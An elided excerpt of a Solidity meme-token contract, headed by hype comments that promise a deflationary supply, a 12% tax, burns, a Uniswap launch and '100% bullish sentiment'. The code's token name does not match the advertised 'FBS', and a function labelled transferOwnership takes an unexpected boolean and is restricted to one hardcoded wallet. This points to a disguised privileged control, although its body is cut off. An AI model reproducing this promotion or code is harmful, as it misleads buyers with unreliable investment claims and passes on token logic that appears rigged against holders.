...
// MEME TOKEN UPON ON ELON MUSKS TWEET

/*

 A Deflationary tokenomics 🚀 with a super wide vision, lets show musk the power of DEGENS
 
 Not another pump and dump TOKEN 
 ...
 Token WITH THE 100% BULLISH SENTIMENT
 
 TOKENOMICS
  - 1,000,000,000,000,000 FBS
  - 12% TAX ON EACH TRANSACTION 
 ...
 🔥FAIRLAUNCH ON UNISWAP🔥
  ...
  Let the RUSH be Real 

  For every Zero Killed, 5% will be bought back and Burned 🔥 to the BLACKHOLE address 🚀
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    constructor() public {
        _name = "Plastic Strawl";
        _symbol = "PlasticStrawl";
        _decimals = 9;
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0x818f9AcD80AA289D1Ddc716e4A312372d790Ab06,
